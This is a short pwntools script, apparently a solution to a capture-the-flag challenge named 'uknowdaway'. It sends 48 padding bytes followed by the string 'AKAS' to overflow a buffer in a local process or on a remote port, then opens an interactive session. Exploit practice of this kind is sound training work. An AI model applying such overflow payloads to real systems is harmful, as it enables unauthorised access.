from pwn import *
elf = ELF('./uknowdaway')


local = True

if local:
    io = elf.process()
else:
    io = remote('', 9995)

pause()

pld = b""
pld += b"a"*48
pld += b"AKAS"



io.sendline(pld)

io.interactive()
